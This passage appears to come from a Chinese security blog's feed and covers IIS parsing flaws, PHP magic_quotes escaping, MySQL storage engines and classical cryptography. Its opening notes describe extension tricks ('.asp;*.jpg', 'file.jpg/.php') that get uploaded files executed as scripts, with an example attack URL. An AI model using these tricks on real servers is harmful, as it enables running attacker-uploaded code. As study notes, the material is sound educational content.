&lt;p&gt;2、IIS5.0-6.0下，如果一个文件的扩展名采用”.asp;*.jpg”的形式，那么该文件也会被当做asp文件解析执行&lt;/p&gt;

&lt;p&gt;3、IIS70下，如果php.ini中的cgi.cgi_pathinfo=1同时IIS7.0在Fast-CGI运行模式下，则可以在恶意文件后面添加&lt;code&gt;/.php&lt;/code&gt;使得其解析为php。如&lt;code&gt;http://192.168.61.141/789.jpg/.php&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;参考链接：&lt;/p&gt;

&lt;p&gt;https://www.cnblogs.com/baifan2618/p/7704678.html&lt;/p&gt;

&lt;p&gt;https://blog.csdn.net/nzjdsds/article/details/96989492&lt;/p&gt;</content><author><name></name></author><category term="安全" /><summary type="html">[toc]</summary></entry><entry><title type="html">GPC&amp;amp;绕过</title><link href="http://localhost:4000/_posts/2020-07-25-GPC&%E7%BB%95%E8%BF%87/" rel="alternate" type="text/html" title="GPC&amp;绕过" /><published>2020-07-25T00:00:00-04:00</published><updated>2020-07-25T00:00:00-04:00</updated><id>http://localhost:4000/_posts/GPC&amp;%E7%BB%95%E8%BF%87</id><content type="html" xml:base="http://localhost:4000/_posts/2020-07-25-GPC&amp;%E7%BB%95%E8%BF%87/">&lt;p&gt;[toc]&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;PHP magic_quotes_gpc作用范围是：WEB客户服务端；作用时间：请求开始时&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&quot;使用&quot;&gt;使用&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;对于PHP magic_quotes_gpc=on的情况， 我们可以不对输入和输出数据库的字符串数据作addslashes()和&lt;a href=&quot;https://baike.baidu.com/item/stripslashes&quot;&gt;stripslashes&lt;/a&gt;()的操作,数据也会正常显示。如果此时你对输入的数据作了addslashes()处理，那么在输出的时候就必须使用stripslashes()去掉多余的&lt;a href=&quot;https://baike.baidu.com/item/反斜杠&quot;&gt;反斜杠&lt;/a&gt;。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;对于PHP magic_quotes_gpc=off 的情况,必须使用addslashes()对输入数据进行处理，但并不需要使用stripslashes()格式化输出，因为addslashes()并未将反斜杠一起写入数据库，只是帮助mysql完成了sql语句的执行。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;实例&quot;&gt;实例&lt;/h1&gt;

&lt;p&gt;条件： PHP magic_quotes_gpc=off&lt;/p&gt;

&lt;p&gt;写入数据库的字符串未经过任何过滤处理。从数据库读出的字符串也未作任何处理。&lt;/p&gt;

&lt;p&gt;数据：  $data=”snow”’’sun” ; (snow和sun之间是四个连续的单引号).&lt;/p&gt;

&lt;p&gt;操作： 将字符串:”snow”’’sun” 写入数据库，&lt;/p&gt;

&lt;p&gt;结果： 出现sql语句错误，mysql不能顺利完成sql语句，写入数据库失败。&lt;/p&gt;

&lt;p&gt;数据库保存格式：无数据。&lt;/p&gt;

&lt;p&gt;输出数据格式：无数据。&lt;/p&gt;

&lt;p&gt;说明： 对于未经处理的单引号在写入数据库时会使sql语句发生错误。&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;条件： PHP magic_quotes_gpc=off&lt;/p&gt;

&lt;p&gt;写入数据库的字符串经过函数addslashes()处理。从数据库读出的字符串未作任何处理。&lt;/p&gt;

&lt;p&gt;数据：  $data=”snow”’’sun” ; (snow和sun之间是四个连续的单引号).&lt;/p&gt;

&lt;p&gt;操作： 将字符串:”snow”’’sun” 写入数据库，&lt;/p&gt;

&lt;p&gt;结果： sql语句顺利执行，数据成功写入数据库&lt;/p&gt;

&lt;p&gt;数据库保存格式：snow”’’sun (和输入一样)&lt;/p&gt;

&lt;p&gt;输出数据格式：snow”’’sun (和输入一样)&lt;/p&gt;

&lt;p&gt;说明： addslashes()函数将单引号转换为\’的&lt;a href=&quot;https://baike.baidu.com/item/转义字符&quot;&gt;转义字符&lt;/a&gt;使sql语句成功执行，&lt;/p&gt;

&lt;p&gt;但\’并未作为数据存入数据库，数据库保存的是snow”’’sun 而并不是我们想象的snow\’\’\’\’sun&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;条件： PHP magic_quotes_gpc=on&lt;/p&gt;

&lt;p&gt;写入数据库的字符串未经过任何处理。从数据库读出的字符串未作任何处理。&lt;/p&gt;

&lt;p&gt;数据：  $data=”snow”’’sun” ; (snow和sun之间是四个连续的单引号).&lt;/p&gt;

&lt;p&gt;操作： 将字符串:”snow”’’sun” 写入数据库，&lt;/p&gt;

&lt;p&gt;结果： sql语句顺利执行，数据成功写入数据库&lt;/p&gt;

&lt;p&gt;数据库保存格式：snow”’’sun (和输入一样)&lt;/p&gt;

&lt;p&gt;输出数据格式：snow”’’sun (和输入一样)&lt;/p&gt;

&lt;p&gt;说明： PHP magic_quotes_gpc=on 将单引号转换为\’的&lt;a href=&quot;https://baike.baidu.com/item/转义字符&quot;&gt;转义字符&lt;/a&gt;使sql语句成功执行，&lt;/p&gt;

&lt;p&gt;但\’并未作为数据入数据库，数据库保存的是snow”’’sun而并不是我们想象的snow\’\’\’\’sun。&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;条件： PHP magic_quotes_gpc=on&lt;/p&gt;

&lt;p&gt;写入数据库的字符串经过函数addlashes()处理。从数据库读出的字符串未作任何处理。&lt;/p&gt;

&lt;p&gt;数据：  $data=”snow”’’sun” ; (snow和sun之间是四个连续的单引号).&lt;/p&gt;

&lt;p&gt;操作： 将字符串:”snow”’’sun” 写入数据库，&lt;/p&gt;

&lt;p&gt;结果： sql语句顺利执行，数据成功写入数据库&lt;/p&gt;

&lt;p&gt;数据库保存格式：snow\’\’\’\’sun (添加了&lt;a href=&quot;https://baike.baidu.com/item/转义字符&quot;&gt;转义字符&lt;/a&gt;)&lt;/p&gt;

&lt;p&gt;输出数据格式：snow\’\’\’\’sun (添加了转义字符)&lt;/p&gt;

&lt;p&gt;说明： PHP magic_quotes_gpc=on 将单引号转换为\’的转义字符使sql语句成功执行，&lt;/p&gt;

&lt;p&gt;addslashes又将即将写入数据库的单引号转换为\’,后者的转换被作为数据写入&lt;/p&gt;

&lt;p&gt;数据库，数据库保存的是snow\’\’\’\’sun&lt;/p&gt;</content><author><name></name></author><category term="安全" /><summary type="html">[toc]</summary></entry><entry><title type="html">MySql存储引擎</title><link href="http://localhost:4000/_posts/2020-07-22-MySql%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E/" rel="alternate" type="text/html" title="MySql存储引擎" /><published>2020-07-22T00:00:00-04:00</published><updated>2020-07-22T00:00:00-04:00</updated><id>http://localhost:4000/_posts/MySql%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E</id><content type="html" xml:base="http://localhost:4000/_posts/2020-07-22-MySql%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E/">&lt;p&gt;[toc]&lt;/p&gt;

&lt;h1 id=&quot;什么是存储引擎&quot;&gt;什么是存储引擎&lt;/h1&gt;

&lt;p&gt;数据库存储引擎是数据库底层软件组件，数据库管理系统使用数据引擎进行创建、查询、更新和删除数据操作。不同的存储引擎提供不同的存储机制、索引技巧、锁定水平等功能，使用不同的存储引擎还可以获得特定的功能。&lt;/p&gt;

&lt;p&gt;现在许多数据库管理系统都支持多种不同的存储引擎。MySQL 的核心就是存储引擎。&lt;/p&gt;

&lt;p&gt;&lt;code&gt;提示：InnoDB 事务型数据库的首选引擎，支持事务安全表（ACID），支持行锁定和外键。MySQL 5.5.5 之后，InnoDB 作为默认存储引擎&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;MyISAM 是基于 ISAM 的存储引擎，并对其进行扩展，是在 Web、数据仓储和其他应用环境下最常使用的存储引擎之一。MyISAM 拥有较高的插入、查询速度，但不支持事务。&lt;/p&gt;

&lt;p&gt;MEMORY 存储引擎将表中的数据存储到内存中，为查询和引用其他数据提供快速访问。&lt;/p&gt;

&lt;h1 id=&quot;mysql-57-支持的存储引擎&quot;&gt;MySQL 5.7 支持的存储引擎&lt;/h1&gt;

&lt;p&gt;MySQL 支持多种类型的数据库引擎，可分别根据各个引擎的功能和特性为不同的数据库处理任务提供各自不同的适应性和灵活性。在 MySQL 中，可以利用 &lt;code&gt;SHOW ENGINES&lt;/code&gt; 语句来显示可用的数据库引擎和默认引擎。&lt;/p&gt;

&lt;p&gt;MySQL 提供了多个不同的存储引擎，包括处理事务安全表的引擎和处理非事务安全表的引擎。在 MySQL 中，不需要在整个服务器中使用同一种存储引擎，针对具体的要求，可以对每一个表使用不同的存储引擎。&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Support 列的值表示某种引擎是否能使用，&lt;code&gt;YES&lt;/code&gt;表示可以使用，&lt;code&gt;NO&lt;/code&gt;表示不能使用，&lt;code&gt;DEFAULT&lt;/code&gt;表示该引擎为当前默认的存储引擎。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&quot;如何选择-mysql-存储引擎&quot;&gt;如何选择 MySQL 存储引擎&lt;/h1&gt;

&lt;p&gt;不同的存储引擎都有各自的特点，以适应不同的需求，如表所示。为了做出选择，首先要考虑每一个存储引擎提供了哪些不同的功能。&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;功能&lt;/th&gt;
      &lt;th&gt;MylSAM&lt;/th&gt;
      &lt;th&gt;MEMORY&lt;/th&gt;
      &lt;th&gt;InnoDB&lt;/th&gt;
      &lt;th&gt;Archive&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;存储限制&lt;/td&gt;
      &lt;td&gt;256TB&lt;/td&gt;
      &lt;td&gt;RAM&lt;/td&gt;
      &lt;td&gt;64TB&lt;/td&gt;
      &lt;td&gt;None&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;支持事务&lt;/td&gt;
      &lt;td&gt;No&lt;/td&gt;
      &lt;td&gt;No&lt;/td&gt;
      &lt;td&gt;Yes&lt;/td&gt;
      &lt;td&gt;No&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;支持全文索引&lt;/td&gt;
      &lt;td&gt;Yes&lt;/td&gt;
      &lt;td&gt;No&lt;/td&gt;
      &lt;td&gt;No&lt;/td&gt;
      &lt;td&gt;No&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;支持树索引&lt;/td&gt;
      &lt;td&gt;Yes&lt;/td&gt;
      &lt;td&gt;Yes&lt;/td&gt;
      &lt;td&gt;Yes&lt;/td&gt;
      &lt;td&gt;No&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;支持哈希索引&lt;/td&gt;
      &lt;td&gt;No&lt;/td&gt;
      &lt;td&gt;Yes&lt;/td&gt;
      &lt;td&gt;No&lt;/td&gt;
      &lt;td&gt;No&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;支持数据缓存&lt;/td&gt;
      &lt;td&gt;No&lt;/td&gt;
      &lt;td&gt;N/A&lt;/td&gt;
      &lt;td&gt;Yes&lt;/td&gt;
      &lt;td&gt;No&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;支持外键&lt;/td&gt;
      &lt;td&gt;No&lt;/td&gt;
      &lt;td&gt;No&lt;/td&gt;
      &lt;td&gt;Yes&lt;/td&gt;
      &lt;td&gt;No&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;1、事务安全
InnoDB支持事务安全,MyISAM和MEMORY两个不支持。&lt;/p&gt;

&lt;p&gt;2、储存限制
InnoDB有64TB的存储限制，MyISAM和MEMORY要是具体情况而定。&lt;/p&gt;

&lt;p&gt;3、空间使用
InnoDB对空间使用程度较高，MyISAM和MEMORY对空间使用程度较低。&lt;/p&gt;

&lt;p&gt;4、内存使用
InnoDB和MEMORY对内存使用程度较高，MyISAM对内存使用程度较低。&lt;/p&gt;

&lt;p&gt;5、插入数据的速度：
InnoDB插入数据的速度较低，MyISAM和MEMORY插入数据的速度较高。&lt;/p&gt;

&lt;p&gt;6、对外键的支持：
InnoDB对外键支持情况较好，MyISAM和MEMORY两个不支持外键。&lt;/p&gt;

&lt;p&gt;可以根据以下的原则来选择 MySQL 存储引擎：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;如果要提供提交、回滚和恢复的事务安全（ACID 兼容）能力，并要求实现并发控制，InnoDB 是一个很好的选择。&lt;/li&gt;
  &lt;li&gt;如果数据表主要用来插入和查询记录，则 MyISAM 引擎提供较高的处理效率。&lt;/li&gt;
  &lt;li&gt;如果只是临时存放数据，数据量不大，并且不需要较高的数据安全性，可以选择将数据保存在内存的 MEMORY 引擎中，MySQL 中使用该引擎作为临时表，存放查询的中间结果。&lt;/li&gt;
  &lt;li&gt;如果只有 INSERT 和 SELECT 操作，可以选择Archive 引擎，Archive 存储引擎支持高并发的插入操作，但是本身并不是事务安全的。Archive 存储引擎非常适合存储归档数据，如记录日志信息可以使用 Archive 引擎。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;三种引擎特点如下：
1、InnoDB存储引擎InnoDB是事务型数据库的首选引擎，支持事务安全表（ACID），其它存储引擎都是非事务安全表，支持行锁定和外键，MySQL5.5以后默认使用InnoDB存储引擎。&lt;/p&gt;

&lt;p&gt;InnoDB特点： 支持事务处理，支持外键，支持崩溃修复能力和并发控制。如果需要对事务的完整性要求比较高（比如银行），要求实现并发控制（比如售票），那选择InnoDB有很大的优势。&lt;/p&gt;

&lt;p&gt;如果需要频繁的更新、删除操作的数据库，也可以选择InnoDB，因为支持事务的提交（commit）和回滚（rollback）。&lt;/p&gt;

&lt;p&gt;2、MyISAM存储引擎 MyISAM基于ISAM存储引擎，并对其进行扩展。它是在Web、数据仓储和其他应用环境下最常使用的存储引擎之一。MyISAM拥有较高的插入、查询速度，但不支持事务，不支持外键。&lt;/p&gt;

&lt;p&gt;MyISAM特点： 插入数据快，空间和内存使用比较低。如果表主要是用于插入新记录和读出记录，那么选择MyISAM能实现处理高效率。如果应用的完整性、并发性要求比较低，也可以使用&lt;/p&gt;

&lt;p&gt;3、MEMORY存储引擎 MEMORY存储引擎将表中的数据存储到内存中，为查询和引用其他表数据提供快速访问。&lt;/p&gt;

&lt;p&gt;MEMORY特点： 所有的数据都在内存中，数据的处理速度快，但是安全性不高。如果需要很快的读写速度，对数据的安全性要求较低，可以选择MEMOEY。&lt;/p&gt;

&lt;p&gt;它对表的大小有要求，不能建立太大的表。所以，这类数据库只使用在相对较小的数据库表。&lt;/p&gt;

&lt;h1 id=&quot;mysql-默认存储引擎&quot;&gt;MySQL 默认存储引擎&lt;/h1&gt;

&lt;p&gt;nnoDB 是系统的默认引擎，支持可靠的事务处理。&lt;/p&gt;

&lt;p&gt;使用下面的语句可以修改数据库临时的默认存储引擎&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-sql&quot;&gt;SET default_storage_engine=&amp;lt; 存储引擎名 &amp;gt;
&lt;/code&gt;&lt;/pre&gt;</content><author><name></name></author><category term="sql" /><summary type="html">[toc]</summary></entry><entry><title type="html">密码学基础总结</title><link href="http://localhost:4000/_posts/2020-07-19-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93/" rel="alternate" type="text/html" title="密码学基础总结" /><published>2020-07-19T00:00:00-04:00</published><updated>2020-07-19T00:00:00-04:00</updated><id>http://localhost:4000/_posts/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93</id><content type="html" xml:base="http://localhost:4000/_posts/2020-07-19-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93/">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;基础概念&quot;&gt;基础概念&lt;/h1&gt;

&lt;h2 id=&quot;信息安全三要素cia&quot;&gt;信息安全三要素（CIA）&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;机密性&lt;/li&gt;
  &lt;li&gt;完整性&lt;/li&gt;
  &lt;li&gt;可用性&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;扩展：&lt;/p&gt;

&lt;p&gt;六要素：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;机密性&lt;/li&gt;
  &lt;li&gt;所有权&lt;/li&gt;
  &lt;li&gt;完整性&lt;/li&gt;
  &lt;li&gt;可认证性&lt;/li&gt;
  &lt;li&gt;可用性&lt;/li&gt;
  &lt;li&gt;实用性&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;八要素：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;机密性&lt;/li&gt;
  &lt;li&gt;完整性&lt;/li&gt;
  &lt;li&gt;可用性&lt;/li&gt;
  &lt;li&gt;隐私性&lt;/li&gt;
  &lt;li&gt;可认证性于可信任性&lt;/li&gt;
  &lt;li&gt;不可抵赖性&lt;/li&gt;
  &lt;li&gt;可说明性&lt;/li&gt;
  &lt;li&gt;可审计性&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;安全性攻击形式&quot;&gt;安全性攻击形式&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;被动攻击
    &lt;ul&gt;
      &lt;li&gt;截取&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;主动攻击
    &lt;ul&gt;
      &lt;li&gt;中断&lt;/li&gt;
      &lt;li&gt;篡改&lt;/li&gt;
      &lt;li&gt;伪造&lt;/li&gt;
      &lt;li&gt;重放&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;密码编码学&quot;&gt;密码编码学&lt;/h1&gt;

&lt;h2 id=&quot;保密体制&quot;&gt;保密体制&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;对称加密体制&lt;/li&gt;
  &lt;li&gt;非对称加密体制&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;认证体制&quot;&gt;认证体制&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;消息认证
    &lt;ul&gt;
      &lt;li&gt;消息认证码体制&lt;/li&gt;
      &lt;li&gt;数字签名&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;实体认证
    &lt;ul&gt;
      &lt;li&gt;生份鉴别协议&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;对称与非对称加密体制&quot;&gt;对称与非对称加密体制&lt;/h1&gt;

&lt;h2 id=&quot;对称加密体制&quot;&gt;对称加密体制&lt;/h2&gt;

&lt;p&gt;实用的秘钥必须完全保密，且要求加密秘钥和解密秘钥相同或由其中一个可以很容易推出另外一个&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;优点&lt;/li&gt;
&lt;/ul&gt;

&lt;ol&gt;
  &lt;li&gt;速度快，有很高的吞吐率，软硬件易于实现&lt;/li&gt;
  &lt;li&gt;秘钥相对较短&lt;/li&gt;
  &lt;li&gt;对称保密体制密文长度往往与明文相同，或扩张较小&lt;/li&gt;
&lt;/ol&gt;

&lt;ul&gt;
  &lt;li&gt;缺点&lt;/li&gt;
&lt;/ul&gt;

&lt;ol&gt;
  &lt;li&gt;秘钥分发需要安全通道&lt;/li&gt;
  &lt;li&gt;秘钥量大，难管理&lt;/li&gt;
  &lt;li&gt;难以解决不可否认性&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;非对称加密体制&quot;&gt;非对称加密体制&lt;/h2&gt;

&lt;p&gt;秘钥有两个，一个对外公开，另外一个必须保密，不能从公钥推到私钥，或者是计算困难&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;优点&lt;/li&gt;
&lt;/ul&gt;

&lt;ol&gt;
  &lt;li&gt;秘钥分发容易&lt;/li&gt;
  &lt;li&gt;秘钥管理简单&lt;/li&gt;
  &lt;li&gt;可以有效实现数字签名&lt;/li&gt;
&lt;/ol&gt;

&lt;ul&gt;
  &lt;li&gt;缺点&lt;/li&gt;
&lt;/ul&gt;

&lt;ol&gt;
  &lt;li&gt;速度慢&lt;/li&gt;
  &lt;li&gt;同等安全下，非对称密码体制对秘钥位数要多一些&lt;/li&gt;
  &lt;li&gt;非对称保密体制中，密文长度往往大于明文长度&lt;/li&gt;
&lt;/ol&gt;

&lt;h1 id=&quot;柯克霍夫原则&quot;&gt;柯克霍夫原则&lt;/h1&gt;

&lt;blockquote&gt;
  &lt;p&gt;kerckhoffs princip&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;秘钥必须完全寓于秘钥中，即加密和解密算法的安全性取决于秘钥的安全性，而加密解密的过程和细节是公开的，只要秘钥是安全的，则攻击者无法推出明文&lt;/p&gt;

&lt;p&gt;实际应用中，攻击者的能力还会受到进一步限制：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;破解密码系统的成本不超过被加密信息本身&lt;/li&gt;
  &lt;li&gt;破译密码系统时间不超过被加密信息的有效生命周期&lt;/li&gt;
&lt;/ol&gt;

&lt;h1 id=&quot;密码学加密系统的五元组&quot;&gt;密码学加密系统的五元组&lt;/h1&gt;

&lt;pre&gt;&lt;code&gt;明文，密文，密钥，加密算法，解密算法
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&quot;密码体制攻击类型&quot;&gt;密码体制攻击类型&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;唯密文攻击（Ciphertext only）
 破译者已知：加密算法、待破译的密文&lt;/li&gt;
  &lt;li&gt;已知明文攻击（Known plaintext）
 破译者已知：加密算法、一定数量的明文和对应的密文&lt;/li&gt;
  &lt;li&gt;选择明文攻击（Chosen plaintext） 
破译者已知：加密算法、选定的明文和对应的密文&lt;/li&gt;
  &lt;li&gt;选择密文攻击（Chosen ciphertext） 
破译者已知：加密算法、选定的密文和对应的明文&lt;/li&gt;
  &lt;li&gt;选择文本攻击（Chosen text）
破译者已知：加密算法、选定的明文和对应的密文、选定的密文和对应的明文&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;对加密系统的攻击类型前四种&quot;&gt;对加密系统的攻击类型（前四种）&lt;/h1&gt;

&lt;pre&gt;&lt;code&gt;1.已知明文攻击 （知道一些名密文对）
2选择明文攻击 （任意明文-&amp;gt;密文）
3.唯密文攻击 （只知道一些密文）    
4选择密文攻击（任意密文-&amp;gt;明文）
5.选择文本攻击（任意明文&amp;lt;-&amp;gt;任意密文）
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&quot;攻击常用方法&quot;&gt;攻击常用方法&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;穷举&lt;/li&gt;
  &lt;li&gt;统计分析&lt;/li&gt;
  &lt;li&gt;数学分析&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;熵&quot;&gt;熵&lt;/h1&gt;

&lt;p&gt;&lt;em&gt;随机事件x发生的概率的对数的相反数定义为该随机事件的自信息量，记为I（xi），设xi发生的概率为p（xi），则自信息量为：&lt;/em&gt;
&lt;script type=&quot;math/tex&quot;&gt;I(x)_{i} = - log_{2}p(x_{i})&lt;/script&gt;
底数为2，信息量单位为比特，如果以e为底数，单位为奈特&lt;/p&gt;

&lt;h1 id=&quot;古典密码&quot;&gt;古典密码&lt;/h1&gt;

&lt;h2 id=&quot;置换&quot;&gt;置换&lt;/h2&gt;

&lt;p&gt;置换：根据一定的规则重新排列明文，打破明文结构特性&lt;/p&gt;

&lt;h3 id=&quot;列置换&quot;&gt;列置换&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;明文按照秘钥规则按列换位并且得到密文&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;/img/置换密码.png&quot; alt=&quot;置换密码&quot; /&gt;&lt;/p&gt;

&lt;h3&gt;&lt;img src=&quot;/img/置换密码举例.png&quot; alt=&quot;置换密码举例&quot; /&gt;&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;/img/列置换.png&quot; alt=&quot;列置换&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/列置换2.png&quot; alt=&quot;列置换2&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;周期置换&quot;&gt;周期置换&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;将明文按照固定长度分组，然后对每组按照某种排列位置得到密文&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;strong&gt;例子&lt;/strong&gt;:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;明文：“State Key Laboratory of Networking and Switching”&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;加密的密钥：S=(1 5 6 2 3)；&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;将明文分为七组，每组6个字符，不足6个的用双方规定好的字符进行填充，比如空格。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;​      P’ = (StateK)(eyLabo)(ratory)(ofNetw)(orking)(andSwi)(tching)&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;对每组的字符进行加密，根据密钥S，可知将第1个字符放在第5个字符的位置，第5个字符放在第6个字符的位置，第6个字符放在第2个字符的位置，第2个字符放在第3个字符的位置，第3个字符放在第1个字符的位置，置换后P’如下：&lt;/p&gt;

    &lt;p&gt;P‘ = (aKttSe)(Loyaeb)(tyaorr)(Nwfeot)(kgrion)(dinSaw)(hgcitn)&lt;/p&gt;

    &lt;p&gt;所以得到的最终密文Pm = “aKttSeLoyaebtyaorrNwfeotkgriondinSawhgcitn”&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;周期置换的解密方法就是加密的逆运算，只需求出密钥的逆置换即可。可以知道密钥S=(1 5 6 2 3)的逆置换S’ = (1 3 2 6 5)，所以只需将密文重新分组，通过S’的置换顺序就可以得出明文P&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;代换密码&quot;&gt;代换密码&lt;/h2&gt;

&lt;p&gt;代换，就是将明文中的一个字母由其它字母、数字或者符号替代的一种方法
代换密码建立一个代换表，加密时将需要加密的明文依次通过查表，替换为相应的字符，明文字符被逐个替换后，生成无任何意义的字符串，即密文。这样的代换表被称为密钥&lt;/p&gt;

&lt;h3 id=&quot;单表代换密码&quot;&gt;单表代换密码&lt;/h3&gt;

&lt;p&gt;单表代换是指英文字母在进行密码编码替换的时候，有一张对照表，也就是说，对于每一个字母，都是唯一对应的，如：&lt;/p&gt;

&lt;p&gt;26个源字母表为：abcdefghijklmnopqrstuvwxyz&lt;/p&gt;

&lt;p&gt;代换的字母表为：qwertyuiopasdfghjklzxcvbnm&lt;/p&gt;

&lt;p&gt;在加密时，按照设计好的对照表对每一个明文字母进行替换，如a替换为q，b替换为w等。&lt;/p&gt;

&lt;h3 id=&quot;放射密码&quot;&gt;放射密码&lt;/h3&gt;

&lt;p&gt;加法密码和乘法密码结合就构成仿射密码，仿射密码的加密和解密算法是：
&lt;script type=&quot;math/tex&quot;&gt;C=EK(m)=(k_{1}m+k_{2})modn\\
M = DK(C)=k_{3}(C-k_{2})mod n\\
(k_{3}Xk_{1})mod 26=1\\&lt;/script&gt;&lt;/p&gt;

&lt;p&gt;仿射密码具有可逆性的条件是:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;gcd(k1, n)=1&lt;/code&gt;. 当k1=1时，仿射密码变为加法密码，当k2=0时，仿射密码变为乘法密码。
仿射密码中的密钥空间的大小为&lt;code&gt;nφ(n)&lt;/code&gt;，当&lt;code&gt;n&lt;/code&gt;为&lt;code&gt;26&lt;/code&gt;字母，&lt;code&gt;φ(n)=12&lt;/code&gt;，因此仿射密码的密钥空间为12×26 = 312&lt;/p&gt;

&lt;h4 id=&quot;例子&quot;&gt;例子&lt;/h4&gt;

&lt;p&gt;设放射密码加密函数为：&lt;code&gt;e(x)=11x+6(mod 26)&lt;/code&gt;,则有11^{-1}(mod26)=19,所以解密函数:&lt;code&gt;x=19[e(x)-6]=19e(x)+16(mod 26)&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;设加密明文：&lt;code&gt;sorcery&lt;/code&gt;，转换为数字：&lt;code&gt;18,14,17,2,4,17,24&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;加密：
&lt;script type=&quot;math/tex&quot;&gt;% &lt;![CDATA[
11*
 \left[
 \begin{matrix}
   18 \\
   14 \\
   17\\
   2\\
   4\\
   17\\
   24\\
  \end{matrix}
  \right]
+
 \left[
 \begin{matrix}
   6 \\
   6 \\
   6\\
   6\\
   6\\
   6\\
   6\\
  \end{matrix}
  \right]
  =
   \left[
 \begin{matrix}
   204 \\
   160\\
   193\\
  28\\
   50\\
   193\\
  270\\
  \end{matrix}
  \right]
  =
   \left[
 \begin{matrix}
   22 \\
   4\\
   11\\
  2\\
   24\\
   11\\
  10\\
  \end{matrix}
  \right]
 (mod26)
&lt; =&gt;
 \left[
 \begin{matrix}
   W \\
   E\\
   L\\
   C\\
   y\\
   L\\
   K\\
  \end{matrix}
  \right] %]]&gt;&lt;/script&gt;
解密：
&lt;script type=&quot;math/tex&quot;&gt;% &lt;![CDATA[
19*
 \left[
 \begin{matrix}
   22 \\
   4 \\
   11\\
   2\\
   24\\
   11\\
   10\\
  \end{matrix}
  \right]
+
 \left[
